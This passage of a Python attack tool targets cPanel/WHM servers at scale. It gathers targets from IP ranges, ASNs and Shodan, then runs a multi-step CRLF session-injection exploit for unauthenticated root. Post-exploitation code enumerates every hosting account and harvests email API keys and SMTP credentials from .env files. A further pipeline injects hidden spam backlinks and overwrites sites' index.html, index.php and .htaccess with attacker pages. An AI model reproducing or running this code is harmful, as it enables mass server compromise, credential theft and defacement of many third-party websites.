            prefixes = await resolve_asn_prefixes(asn, proxy_mgr=None, ipinfo_token=ipinfo_token)
            asn_prefixes.extend(prefixes)
        if asn_prefixes:
            total_ips = sum(
                ipaddress.ip_network(p, strict=False).num_addresses
                for p in asn_prefixes if _safe_prefix(p)
            )
            print(f"[asn] {len(asn_prefixes)} prefix(es) → up to {total_ips:,} IPs", flush=True)
            targets = list(targets) + asn_prefixes

    # Expand CIDRs
    expanded: list[str] = []
    for t in targets:
        t = t.strip()
        if not t or t.startswith("#"):
            continue
        if "/" in t:
            try:
                net = ipaddress.ip_network(t, strict=False)
                hosts_in_net = list(net.hosts()) or [net.network_address]
                random.shuffle(hosts_in_net)
                expanded.extend(str(ip) for ip in hosts_in_net)
                print(f"[targets] Expanded {t} → {len(hosts_in_net)} hosts", flush=True)
            except ValueError:
                expanded.append(t)
        else:
            expanded.append(t)

    # Shodan/Censys/Netlas discovery
    discovered: list[str] = []
    if shodan_key:
        for q in cfg.get("shodan_queries", []):
            try:
                hits = await _shodan_search(q, shodan_key, proxy_mgr)
                discovered.extend(hits)
                if hits:
                    print(f"[shodan] {q!r} → {len(hits)} host(s)", flush=True)
            except Exception as e:
                print(f"[shodan] {q!r} error: {e}", flush=True)

    all_targets = list(dict.fromkeys(expanded + discovered))

    # Checkpoint filter
    probed: set[str] = {
        row[0] for row in conn.execute("SELECT host FROM probed_hosts").fetchall()
    }
    new_targets = [t for t in all_targets if _normalize_host(t) not in probed]
    skipped = len(all_targets) - len(new_targets)
    if skipped:
        print(f"[cpanel] Skipping {skipped:,} already-probed host(s).", flush=True)

    if max_hosts_per_run and len(new_targets) > max_hosts_per_run:
        new_targets = new_targets[:max_hosts_per_run]
        print(f"[cpanel] Capped to {max_hosts_per_run:,} hosts this run.", flush=True)

    if not new_targets:
        print("[cpanel] No new targets. Use Clear History to re-probe.", flush=True)
        return

    # TCP prefilter — only keep hosts with cPanel ports open
    print(f"[cpanel] TCP prefilter on {len(new_targets):,} hosts "
          f"(ports {_CPANEL_PORTS}) …", flush=True)
    open_host_ports = await tcp_prefilter(new_targets, ports=_CPANEL_PORTS, concurrency=300)
    print(f"[cpanel] {len(open_host_ports):,} host:port(s) with cPanel ports open.", flush=True)

    if not open_host_ports:
        print("[cpanel] No cPanel ports found.", flush=True)
        _checkpoint(conn, new_targets)
        return

    # Build credential map from existing .env findings
    cred_map = _build_cred_map(conn)
    hosts_with_creds = sum(1 for hp in open_host_ports
                           if hp.rsplit(":", 1)[0] in cred_map)
    print(f"[cpanel] Credential map: {len(cred_map)} host(s) with .env creds "
          f"({hosts_with_creds} overlap with open panels).", flush=True)

    panels = hits = 0

    async for item in run_cpanel_probe(
        open_host_ports,
        concurrency=concurrency,
        proxy_mgr=proxy_mgr,
        cred_map=cred_map,
    ):
        kind = item[0]
        host, port, service, url = item[1], item[2], item[3], item[4]
        counters["scanned"] += 1

        if kind == "rce":
            cve = item[5] if len(item) > 5 else "CVE-2026-41940"
            rce_tok = item[6] if len(item) > 6 else ""
            rce_cpsess = item[7] if len(item) > 7 else ""
            save_cpanel_finding(
                conn, source=f"cve:{cve}", url=url, service=service,
                host=host, port=port, username="root", password="",
                verified=1,
                raw_context="CRLF session injection — unauthenticated root",
            )
            print(f"[cpanel] *** {cve} RCE: {url} — unauthenticated root ***", flush=True)
            hits += 1
            panels += 1
            if rce_tok and rce_cpsess:
                scheme = "https" if port in (2083, 2087) else "http"
                _pe_pm = proxy_mgr or ProxyManager()
                asyncio.create_task(_cpanel_post_exploit(
                    _pe_pm, f"{scheme}://{host}:{port}", rce_cpsess, rce_tok,
                    conn, f"cve:{cve}",
                ))
        elif kind == "login":
            username, password = item[5], item[6]
            save_cpanel_finding(
                conn, source="cpanel-scan", url=url, service=service,
                host=host, port=port, username=username, password=password,
                verified=1, raw_context=None,
            )
            print(f"[cpanel] *** VALID LOGIN: {url} — {username}:{_redact(password)} [{service}] ***",
                  flush=True)
            hits += 1
            panels += 1
        elif kind in ("panel", "noauth"):
            verified = None if kind == "panel" else 0
            save_cpanel_finding(
                conn, source="cpanel-scan", url=url, service=service,
                host=host, port=port, username=None, password=None,
                verified=verified, raw_context=None,
            )
            tag = "PANEL" if kind == "panel" else "PANEL/no-creds-match"
            print(f"[cpanel] {tag}: {url} [{service}]", flush=True)
            panels += 1

    _checkpoint(conn, new_targets)
    print(f"\n[cpanel] Done — {panels} panel(s) found, {hits} valid login(s).", flush=True)


def _checkpoint(conn: sqlite3.Connection, hosts: list[str]) -> None:
    now = datetime.now(timezone.utc).isoformat()
    conn.executemany(
        "INSERT OR REPLACE INTO probed_hosts (host, probed_at) VALUES (?, ?)",
        [(_normalize_host(h), now) for h in hosts],
    )
    conn.commit()


# ── CVE-2026-41940 — cPanel CRLF session injection ────────────────────────────

async def _test_cpanel_crlf_rce(
    pm: ProxyManager,
    host: str,
    port: int,
) -> "Optional[tuple[str, str, str]]":
    """CVE-2026-41940 (CVSS 10.0): CRLF injection into cPanel/WHM session file.

    Returns (verify_url, session_tok, cpsess) on success, None otherwise.
    """
    import base64 as _b64
    scheme = "https" if port in (2083, 2087) else "http"
    base = f"{scheme}://{host}:{port}"
    to = aiohttp.ClientTimeout(total=7, sock_connect=2)
    tag = f"[cve {host}:{port}]"

    # Step 1 — confirm WHM is alive (only called on ports 2086/2087)
    try:
        async with pm.request(
            "GET", base + "/openid_connect/cpanelid",
            timeout=to, allow_redirects=False, ssl=False,
        ) as r1:
            print(f"{tag} step1 → {r1.status}", flush=True)
            if r1.status not in (200, 301, 302, 307, 401, 403):
                print(f"{tag} step1 unexpected status — skip", flush=True)
                return None
    except Exception as e:
        print(f"{tag} step1 error: {e}", flush=True)
        return None

    # Step 2 — POST login as root with wrong password to get whostmgrsession cookie
    # Must use user="root" so cPanel creates/looks up the root session file that
    # we later poison with CRLF injection (arbitrary user won't work).
    session_tok = ""
    try:
        form = aiohttp.FormData()
        form.add_field("user", "root")
        form.add_field("pass", "wrongpassword")
        async with pm.request(
            "POST", base + "/login/?login_only=1", data=form,
            timeout=to, allow_redirects=False, ssl=False,
        ) as r2:
            print(f"{tag} step2 login → {r2.status}", flush=True)
            if r2.status not in (200, 401, 403):
                print(f"{tag} step2 unexpected status — skip", flush=True)
                return None
            # Cookie format: whostmgrsession=SessionName%2CObHex; ...
            # URL-decode then split at comma — first field is the session base name
            for sc in r2.headers.getall("Set-Cookie", []):
                for chunk in sc.split(";"):
                    chunk = chunk.strip()
                    if chunk.startswith("whostmgrsession="):
                        raw_ck = chunk[len("whostmgrsession="):]
                        decoded = urllib.parse.unquote(raw_ck)
                        session_tok = decoded.split(",", 1)[0] if "," in decoded else decoded
                        break
                if session_tok:
                    break
            print(f"{tag} step2 session_tok={'<found>' if session_tok else '<missing>'}", flush=True)
            if not session_tok:
                return None
    except Exception as e:
        print(f"{tag} step2 error: {e}", flush=True)
        return None

    # Re-URL-encode the session base for use in Cookie + Authorization headers
    cookie_enc = urllib.parse.quote(session_tok, safe="")

    # Step 3 — send CRLF-poisoned Authorization header
    # Exact payload bytes from CVE PoC (base64 of the Storable-encoded session data)
    _PAYLOAD_B64 = (
        "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
        "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
    )
    cpsess = ""
    try:
        async with pm.request(
            "GET", base + "/",
            headers={
                "Authorization": f"Basic {_PAYLOAD_B64}",
                "Cookie": f"whostmgrsession={cookie_enc}",
            },
            timeout=to, allow_redirects=False, ssl=False,
        ) as r3:
            loc = r3.headers.get("Location", "")
            print(f"{tag} step3 poison → {r3.status} Location={loc[:80]!r}", flush=True)
            m = re.search(r"/cpsess([A-Za-z0-9]+)/", loc)
            if m:
                cpsess = m.group(1)
    except Exception as e:
        print(f"{tag} step3 error: {e}", flush=True)
        return None

    if not cpsess:
        print(f"{tag} step3 no cpsess in Location — exploit failed", flush=True)
        return None

    print(f"{tag} step3 cpsess={cpsess[:12]}…", flush=True)

    # Step 4 — flush poisoned session via gadget trigger
    try:
        async with pm.request(
            "GET", base + "/scripts2/listaccts",
            headers={"Cookie": f"whostmgrsession={cookie_enc}"},
            timeout=to, allow_redirects=False, ssl=False,
        ) as r4:
            print(f"{tag} step4 gadget → {r4.status}", flush=True)
    except Exception as e:
        print(f"{tag} step4 gadget error (non-fatal): {e}", flush=True)

    # Step 5 — verify root access
    verify_url = f"{base}/cpsess{cpsess}/json-api/version"
    try:
        async with pm.request(
            "GET", verify_url,
            headers={"Cookie": f"whostmgrsession={cookie_enc}"},
            timeout=to, allow_redirects=False, ssl=False,
        ) as r5:
            body5 = (await r5.read()).decode("utf-8", errors="replace")
            print(f"{tag} step5 verify → {r5.status} body={body5[:80]!r}", flush=True)
            if r5.status == 200:
                print(f"{tag} *** ROOT CONFIRMED ***", flush=True)
                return (verify_url, session_tok, cpsess)
            if r5.status in (500, 503) and "license" in body5.lower():
                print(f"{tag} *** ROOT CONFIRMED (license issue) ***", flush=True)
                return (verify_url, session_tok, cpsess)
    except Exception as e:
        print(f"{tag} step5 error: {e}", flush=True)
        return None

    print(f"{tag} step5 not confirmed", flush=True)
    return None


async def _cpanel_post_exploit(
    pm: ProxyManager,
    base: str,
    cpsess: str,
    session_tok: str,
    conn: sqlite3.Connection,
    source: str,
) -> None:
    """WHM post-exploitation after CVE-2026-41940: enumerate accounts and harvest .env keys."""
    to = aiohttp.ClientTimeout(total=15, sock_connect=5)
    _ck = urllib.parse.quote(session_tok, safe="")
    auth_hdrs = {"Cookie": f"whostmgrsession={_ck}"}

    # 1 — list all cPanel accounts
    try:
        async with pm.request(
            "GET", f"{base}/cpsess{cpsess}/json-api/listaccts?api.version=1",
            headers=auth_hdrs, timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
    except Exception as e:
        print(f"[cpanel-pe] listaccts error: {e}", flush=True)
        return

    try:
        data = json.loads(raw)
        accounts = [
            acct["user"]
            for acct in data.get("data", {}).get("acct", [])
            if acct.get("user")
        ]
    except Exception as e:
        print(f"[cpanel-pe] listaccts parse error: {e}", flush=True)
        return

    print(f"[cpanel-pe] {len(accounts)} account(s) on {base}", flush=True)

    # 2 — for each account, read common .env locations via Fileman API
    env_paths = [
        ("public_html", ".env"),
        ("public_html", ".env.local"),
        ("public_html", ".env.production"),
    ]

    new_keys = 0
    for user in accounts:
        for dir_path, filename in env_paths:
            api_url = (
                f"{base}/cpsess{cpsess}/json-api/cpanel"
                f"?cpanel_jsonapi_module=Fileman"
                f"&cpanel_jsonapi_func=viewfile"
                f"&cpanel_jsonapi_user={user}"
                f"&cpanel_jsonapi_version=2"
                f"&dir={dir_path}"
                f"&file={filename}"
            )
            try:
                async with pm.request(
                    "GET", api_url,
                    headers=auth_hdrs, timeout=to, allow_redirects=False, ssl=False,
                ) as resp2:
                    raw2 = (await resp2.read()).decode("utf-8", errors="replace")
                    if resp2.status != 200:
                        continue
            except Exception:
                continue

            # Fileman returns {"cpanelresult": {"data": [{"content": "..."}]}}
            env_text = ""
            try:
                j2 = json.loads(raw2)
                items = j2.get("cpanelresult", {}).get("data", [])
                if items and isinstance(items, list):
                    env_text = items[0].get("content", "")
            except Exception:
                # fallback: maybe it's a plain text response
                if "APP_KEY=" in raw2 or "RESEND" in raw2 or "SENDGRID" in raw2:
                    env_text = raw2

            if not env_text:
                continue

            creds = extract_laravel_creds(env_text)
            file_url = f"{base}/home/{user}/{dir_path}/{filename}"

            for key in creds.get("resend", []):
                if save_finding(
                    conn, source=source, url=file_url,
                    resend_key=key, linked_domain=None,
                    file_path=f"/home/{user}/{dir_path}/{filename}",
                    raw_context=env_text[:500], vendor="resend",
                ):
                    new_keys += 1
                    print(f"[cpanel-pe] {user}: resend key {key[:12]}…", flush=True)

            for key in creds.get("sendgrid", []):
                if save_finding(
                    conn, source=source, url=file_url,
                    resend_key=key, linked_domain=None,
                    file_path=f"/home/{user}/{dir_path}/{filename}",
                    raw_context=env_text[:500], vendor="sendgrid",
                ):
                    new_keys += 1
                    print(f"[cpanel-pe] {user}: sendgrid key {key[:12]}…", flush=True)

            for smtp in creds.get("smtp", []):
                label = f"smtp:{smtp.get('host','?')}:{smtp.get('port','?')}"
                if save_finding(
                    conn, source=source, url=file_url,
                    resend_key=label, linked_domain=smtp.get("from_address"),
                    file_path=f"/home/{user}/{dir_path}/{filename}",
                    raw_context=env_text[:500], vendor="smtp",
                ):
                    new_keys += 1

    print(f"[cpanel-pe] post-exploit complete: {new_keys} new key(s) from {base}", flush=True)


# ── Backlink injection ────────────────────────────────────────────────────────

_backlink_rate_sem = asyncio.Semaphore(3)
_backlink_daily_count = 0
_backlink_daily_date_str: Optional[str] = None

_BL_CONTEXT_SENTENCES = [
    "Looking for productivity tools? Try this {link} for repetitive clicking tasks.",
    "Speed up repetitive tasks with this {link} — free download.",
    "Gamers use this {link} to automate clicks.",
    "Automate repetitive mouse clicks with this {link}.",
    "This {link} is popular for gaming and productivity.",
    "Need to automate mouse clicks? This {link} does the job.",
    "Save time on repetitive tasks — this {link} is free.",
]

_BL_RELEVANCE_BAD = [
    "casino", "gambling", "poker", "slots", "viagra", "cialis",
    "porn", "xxx", "adult content",
]


async def _is_url_alive(pm: "ProxyManager", url: str, timeout: int = 5) -> bool:
    """Return True only if the URL resolves and responds with HTTP < 400."""
    to = aiohttp.ClientTimeout(total=timeout, sock_connect=3)
    candidates = [url]
    # if given https, also try http as fallback
    if url.startswith("https://"):
        candidates.append(url.replace("https://", "http://", 1))
    for u in candidates:
        try:
            async with pm.request(
                "GET", u, timeout=to, allow_redirects=True, ssl=False,
                headers={"User-Agent": "Mozilla/5.0"},
            ) as r:
                return r.status < 400
        except Exception:
            continue
    return False


async def _check_and_store_domain_alive(
    conn: sqlite3.Connection,
    resend_key: str,
    domain: str,
    proxy_mgr: Optional["ProxyManager"] = None,
) -> None:
    """Fire-and-forget: probe domain liveness and persist result to findings.domain_alive."""
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    try:
        alive = await _is_url_alive(pm, f"https://{domain}")
        conn.execute(
            "UPDATE findings SET domain_alive=? WHERE resend_key=?",
            (1 if alive else 0, resend_key),
        )
        conn.commit()
    except Exception:
        pass
    finally:
        if own_pm:
            await pm.close()


def _bl_load_cfg() -> dict:
    return load_config().get("backlink", {})


def _bl_pick_anchor(cfg: dict) -> str:
    import random
    anchors = cfg.get("anchors", {})
    weights = cfg.get("anchor_weights", [40, 40, 20])
    branded = anchors.get("branded", [])
    generic = anchors.get("generic", ["click here", "this tool"])
    exact   = anchors.get("exact",   [])
    r = random.randint(1, 100)
    pool = branded if r <= weights[0] else (generic if r <= weights[0] + weights[1] else exact)
    return random.choice(pool)


def _bl_build_injection(anchor: str, url: str, cfg: dict) -> tuple:
    """Return (head_canonical_html, body_link_html)."""
    import random
    sentences = cfg.get("context_sentences", _BL_CONTEXT_SENTENCES)
    link_html = f'<a href="{url}">{anchor}</a>'
    body = (
        '\n<!-- productivity -->'
        f'<p style="font-size:0;height:0;overflow:hidden">'
        f'{random.choice(sentences).format(link=link_html)}'
        f'</p>\n'
    )
    head = f'\n<link rel="canonical" href="{url}">\n' if cfg.get("inject_canonical", True) else ""
    return head, body


def _bl_is_relevant(body: str, cfg: dict) -> bool:
    if not body:
        return True
    b = body.lower()
    if any(bad in b for bad in _BL_RELEVANCE_BAD):
        return False
    keywords = cfg.get("relevance_keywords", [
        "game", "software", "tool", "download", "windows", "free",
        "click", "app", "productivity", "computer", "tech", "program",
    ])
    return any(k in b for k in keywords) or True  # accept by default


def _bl_inject_into(content: str, head_tag: str, body_link: str, target_url: str) -> Optional[str]:
    """Return modified content with injected links, or None if already present."""
    if target_url in content:
        return None
    result = content
    cl = result.lower()
    if head_tag and "</head>" in cl:
        idx = cl.index("</head>")
        result = result[:idx] + head_tag + result[idx:]
        cl = result.lower()
    if "</body>" in cl:
        idx = cl.index("</body>")
        result = result[:idx] + body_link + result[idx:]
    elif "wp_footer()" in result:
        idx = result.index("wp_footer()")
        result = result[:idx] + body_link + "\n" + result[idx:]
    elif result.rstrip().endswith("?>"):
        result = result.rstrip()[:-2] + body_link + "\n?>"
    else:
        result = result + body_link
    return result


def save_backlink_finding(
    conn: sqlite3.Connection,
    *,
    host: str,
    cpanel_user: str,
    site_url: str,
    file_path: str,
    site_type: str,
    anchor_text: str,
    status: str,
) -> None:
    conn.execute(
        """INSERT OR IGNORE INTO backlink_findings
           (host, cpanel_user, site_url, file_path, site_type, anchor_text, injected_at, status)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
        (host, cpanel_user, site_url, file_path, site_type, anchor_text,
         datetime.now(timezone.utc).isoformat(), status),
    )
    conn.commit()


async def _fileman_list(pm, base: str, cpsess: str, tok: str, user: str, directory: str) -> list:
    to = aiohttp.ClientTimeout(total=10, sock_connect=4)
    url = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=listfiles"
        f"&cpanel_jsonapi_user={user}&cpanel_jsonapi_version=2&dir={directory}"
    )
    try:
        async with pm.request(
            "GET", url, headers={"Cookie": f"whostmgrsession={urllib.parse.quote(tok, safe='')}"},
            timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
            if resp.status != 200:
                return []
        j = json.loads(raw)
        items = j.get("cpanelresult", {}).get("data", [])
        return [i["file"] for i in items if isinstance(i, dict) and i.get("file")]
    except Exception:
        return []


async def _fileman_read_bl(pm, base: str, cpsess: str, tok: str, user: str, directory: str, filename: str) -> Optional[str]:
    to = aiohttp.ClientTimeout(total=15, sock_connect=4)
    url = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=viewfile"
        f"&cpanel_jsonapi_user={user}&cpanel_jsonapi_version=2"
        f"&dir={directory}&file={filename}"
    )
    try:
        async with pm.request(
            "GET", url, headers={"Cookie": f"whostmgrsession={urllib.parse.quote(tok, safe='')}"},
            timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
            if resp.status != 200:
                return None
        j = json.loads(raw)
        items = j.get("cpanelresult", {}).get("data", [])
        if items and isinstance(items, list):
            return items[0].get("content", "")
    except Exception:
        pass
    return None


async def _fileman_write(pm, base: str, cpsess: str, tok: str, user: str, directory: str, filename: str, content: str) -> bool:
    ck = {"Cookie": f"whostmgrsession={urllib.parse.quote(tok, safe='')}"}
    to = aiohttp.ClientTimeout(total=20, sock_connect=4)
    user_enc = urllib.parse.quote(user, safe="")
    dir_enc = urllib.parse.quote(directory, safe="")
    file_enc = urllib.parse.quote(filename, safe="")

    # Attempt 1 — API v2: routing + dir + file in URL, only content in POST body.
    # Mirror of the working viewfile/listfiles pattern: those pass dir/file in the
    # URL query string as GET params; savefile should follow the same convention.
    url1 = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile"
        f"&cpanel_jsonapi_user={user_enc}&cpanel_jsonapi_version=2"
        f"&dir={dir_enc}&file={file_enc}"
    )
    try:
        async with pm.request(
            "POST", url1, data={"content": content}, headers=ck,
            timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
            if resp.status == 200:
                try:
                    j = json.loads(raw)
                    items = j.get("cpanelresult", {}).get("data", [])
                    if items and isinstance(items, list) and items[0].get("result", 0):
                        return True
                    print(f"[fileman] a1 {user}/{filename}: {raw[:200]}", flush=True)
                except Exception:
                    print(f"[fileman] a1-parse {user}/{filename}: {raw[:120]}", flush=True)
            else:
                print(f"[fileman] a1 {user}/{filename} HTTP {resp.status}: {raw[:80]}", flush=True)
    except Exception as e:
        print(f"[fileman] a1-exc {user}/{filename}: {e}", flush=True)

    # Attempt 2 — UAPI (v3): routing in URL with cpanel_jsonapi_apiversion=3,
    # func=save_file_content. Cleaner API generation; WHM proxy supports v3 on
    # cPanel 11.56+. Function params go in the POST body.
    url2 = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_apiversion=3&cpanel_jsonapi_module=Fileman"
        f"&cpanel_jsonapi_func=save_file_content&cpanel_jsonapi_user={user_enc}"
    )
    try:
        async with pm.request(
            "POST", url2, data={"dir": directory, "file": filename, "content": content},
            headers=ck, timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
            if resp.status == 200:
                try:
                    j = json.loads(raw)
                    # UAPI wraps in {"result": {"status": 1, ...}}
                    r = j.get("result", {})
                    if r.get("status") == 1:
                        return True
                    # Some WHM builds re-wrap UAPI in cpanelresult
                    items = j.get("cpanelresult", {}).get("data", [])
                    if items and isinstance(items, list) and items[0].get("result", 0):
                        return True
                    print(f"[fileman] a2 {user}/{filename}: {raw[:200]}", flush=True)
                except Exception:
                    print(f"[fileman] a2-parse {user}/{filename}: {raw[:120]}", flush=True)
            else:
                print(f"[fileman] a2 {user}/{filename} HTTP {resp.status}: {raw[:80]}", flush=True)
    except Exception as e:
        print(f"[fileman] a2-exc {user}/{filename}: {e}", flush=True)

    # Attempt 3 — API v2 multipart: 'file' sent as a proper file-upload field.
    # Some cPanel builds expect the file content as a multipart binary upload
    # (Content-Disposition: name="file"; filename="...") rather than a plain string.
    url3 = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=savefile"
        f"&cpanel_jsonapi_user={user_enc}&cpanel_jsonapi_version=2"
        f"&dir={dir_enc}"
    )
    form = aiohttp.FormData()
    form.add_field(
        "file",
        content.encode("utf-8"),
        filename=filename,
        content_type="application/octet-stream",
    )
    try:
        async with pm.request(
            "POST", url3, data=form, headers=ck,
            timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
            if resp.status == 200:
                try:
                    j = json.loads(raw)
                    items = j.get("cpanelresult", {}).get("data", [])
                    if items and isinstance(items, list) and items[0].get("result", 0):
                        return True
                    print(f"[fileman] a3 {user}/{filename}: {raw[:200]}", flush=True)
                    return False
                except Exception as e:
                    print(f"[fileman] a3-parse {user}/{filename}: {e} | {raw[:120]}", flush=True)
                    return False
            else:
                print(f"[fileman] a3 {user}/{filename} HTTP {resp.status}: {raw[:80]}", flush=True)
    except Exception as e:
        print(f"[fileman] a3-exc {user}/{filename}: {e}", flush=True)

    return False


async def _fileman_delete(pm, base: str, cpsess: str, tok: str, user: str, directory: str, filename: str) -> bool:
    to = aiohttp.ClientTimeout(total=15, sock_connect=4)
    url = (
        f"{base}/cpsess{cpsess}/json-api/cpanel"
        f"?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=trashfiles"
        f"&cpanel_jsonapi_user={user}&cpanel_jsonapi_version=2"
    )
    form = aiohttp.FormData()
    form.add_field("metadata[0][file]", filename)
    form.add_field("metadata[0][dir]", directory)
    try:
        async with pm.request(
            "POST", url, data=form,
            headers={"Cookie": f"whostmgrsession={urllib.parse.quote(tok, safe='')}"},
            timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            return resp.status == 200
    except Exception:
        return False


def _load_deploy_template(name: str) -> str:
    """Load deploy_index.html or deploy_verify.html from the project root."""
    here = Path(__file__).parent
    path = here / name
    if path.exists():
        return path.read_text(encoding="utf-8")
    return ""


async def _deploy_pages_account(
    pm,
    base: str,
    cpsess: str,
    tok: str,
    user: str,
    domain: str,
    conn: sqlite3.Connection,
    host: str,
) -> str:
    """Deploy index.html + verify.html into a single cPanel account's public_html."""
    site_url = f"https://{domain}" if domain else f"http://{user}.{host}"

    # Skip dead/unreachable sites before doing any Fileman work
    if domain and not await _is_url_alive(pm, site_url):
        return "dead"

    index_html  = _load_deploy_template("deploy_index.html")
    verify_html = _load_deploy_template("deploy_verify.html")

    if not index_html and not verify_html:
        print(f"[deploy] No template files found — skipping {user}@{host}", flush=True)
        return "failed"

    # Inject the real site URL so all redirects point back to this domain
    if index_html:
        index_html  = index_html.replace("__SITE_URL__", site_url)
    if verify_html:
        verify_html = verify_html.replace("__SITE_URL__", site_url)

    ok_index  = await _fileman_write(pm, base, cpsess, tok, user, "public_html", "index.html",  index_html)  if index_html  else False
    ok_verify = await _fileman_write(pm, base, cpsess, tok, user, "public_html", "verify.html", verify_html) if verify_html else False

    # Write index.php that serves index.html — covers servers where .htaccess
    # DirectoryIndex is ignored (AllowOverride None) and index.php wins by default.
    # Also overwrites the WordPress bootstrap so our page is served on WP sites.
    index_php = '<?php readfile(__DIR__.\'/index.html\'); ?>'
    await _fileman_write(pm, base, cpsess, tok, user, "public_html", "index.php", index_php)

    # Belt-and-suspenders: also patch .htaccess DirectoryIndex + rewrite rule
    _HT_BLOCK = (
        "DirectoryIndex index.html index.php\n"
        "<IfModule mod_rewrite.c>\n"
        "RewriteEngine On\n"
        "RewriteRule ^(index\\.php)?$ index.html [L,NC]\n"
        "</IfModule>\n"
    )
    existing_htaccess = await _fileman_read_bl(pm, base, cpsess, tok, user, "public_html", ".htaccess") or ""
    if "DirectoryIndex index.html" not in existing_htaccess:
        new_htaccess = _HT_BLOCK + existing_htaccess
        await _fileman_write(pm, base, cpsess, tok, user, "public_html", ".htaccess", new_htaccess)

    status = "deployed" if (ok_index or ok_verify) else "failed"

    save_backlink_finding(
        conn, host=host, cpanel_user=user, site_url=site_url,
        file_path="public_html/index.html + verify.html",
        site_type="deploy", anchor_text="", status=status,
    )

    if status == "deployed":
        label = domain if domain else f"{user}@{host}"
        parts = []
        if ok_index:  parts.append("index.html")
        if ok_verify: parts.append("verify.html")
        print(f"[deploy] ✓ {label} — {', '.join(parts)}", flush=True)

    return status


async def _backlink_post_exploit(
    pm,
    base: str,
    cpsess: str,
    session_tok: str,
    conn: sqlite3.Connection,
    host: str,
) -> None:
    """Enumerate all cPanel accounts on a compromised WHM server and inject backlinks."""
    global _backlink_daily_count, _backlink_daily_date_str

    cfg = _bl_load_cfg()
    rate_cap = cfg.get("daily_rate_cap", 200)

    today = datetime.now().strftime("%Y-%m-%d")
    if _backlink_daily_date_str != today:
        _backlink_daily_date_str = today
        _backlink_daily_count = 0

    to = aiohttp.ClientTimeout(total=15, sock_connect=5)
    _ck = urllib.parse.quote(session_tok, safe="")
    auth_hdrs = {"Cookie": f"whostmgrsession={_ck}"}

    try:
        async with pm.request(
            "GET", f"{base}/cpsess{cpsess}/json-api/listaccts?api.version=1",
            headers=auth_hdrs, timeout=to, allow_redirects=False, ssl=False,
        ) as resp:
            raw = (await resp.read()).decode("utf-8", errors="replace")
    except Exception as e:
        print(f"[backlink] listaccts error on {base}: {e}", flush=True)
        return

    try:
        data = json.loads(raw)
        accounts = [
            (acct["user"], acct.get("domain", ""))
            for acct in data.get("data", {}).get("acct", [])
            if acct.get("user")
        ]
    except Exception as e:
        print(f"[backlink] listaccts parse error: {e}", flush=True)
        return

    print(f"[deploy] {len(accounts)} account(s) on {base} — deploying pages", flush=True)

    deployed = failed = dead = 0
    for user, domain in accounts:
        if _backlink_daily_count >= rate_cap:
            print(f"[deploy] Daily rate cap ({rate_cap}) reached — stopping for today", flush=True)
            break
        async with _backlink_rate_sem:
            result = await _deploy_pages_account(pm, base, cpsess, session_tok, user, domain, conn, host)
        if result == "deployed":
            deployed += 1
            _backlink_daily_count += 1
        elif result == "dead":
            dead += 1
        else:
            failed += 1

    print(f"[deploy] {base}: {deployed} deployed | {dead} dead | {failed} failed", flush=True)


async def _backlink_pipeline(
    targets: list,
    conn: sqlite3.Connection,
    counters: dict,
    concurrency: int,
    proxy_mgr: Optional[ProxyManager] = None,
    shodan_key: Optional[str] = None,
    censys_id: Optional[str] = None,
    censys_secret: Optional[str] = None,
    netlas_key: Optional[str] = None,
    enable_crtsh: bool = False,
    asns: Optional[list] = None,
    ipinfo_token: Optional[str] = None,
    max_hosts_per_run: int = _DEFAULT_MAX_HOSTS_PER_RUN,
) -> None:
    """CVE-2026-41940 → backlink injection pipeline.

    Does only three things: TCP prefilter, CVE check, backlink inject.
    No credential stuffing, no env harvesting, no other scan activity.
    Each confirmed injection is written to DB immediately and logged.
    """
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()

    expanded = expand_targets(targets, auto_expand_ips=False)

    if asns:
        print(f"[asn] Resolving {len(asns)} ASN(s) …", flush=True)
        asn_prefixes: list[str] = []
        for asn in asns:
            prefixes = await resolve_asn_prefixes(asn, proxy_mgr=None, ipinfo_token=ipinfo_token)
            asn_prefixes.extend(prefixes)
        if asn_prefixes:
            total_ips = sum(
                ipaddress.ip_network(p, strict=False).num_addresses
                for p in asn_prefixes if _safe_prefix(p)
            )
            print(f"[asn] {len(asn_prefixes)} prefix(es) → up to {total_ips:,} IPs", flush=True)
            expanded = list(expanded) + asn_prefixes

    probed: set = {row[0] for row in conn.execute("SELECT host FROM probed_hosts").fetchall()}
    new_targets = [t for t in dict.fromkeys(expanded) if _normalize_host(t) not in probed]

    if max_hosts_per_run and len(new_targets) > max_hosts_per_run:
        new_targets = new_targets[:max_hosts_per_run]

    if not new_targets:
        print("[backlink] No new targets.", flush=True)
        if own_pm:
            await pm.close()
        return

    print(f"[backlink] TCP prefilter on {len(new_targets):,} hosts (WHM ports {_WHM_PORTS}) …", flush=True)
    open_host_ports = await tcp_prefilter(new_targets, ports=_WHM_PORTS, concurrency=300)
    print(f"[backlink] {len(open_host_ports):,} host:port(s) with WHM ports open.", flush=True)

    if not open_host_ports:
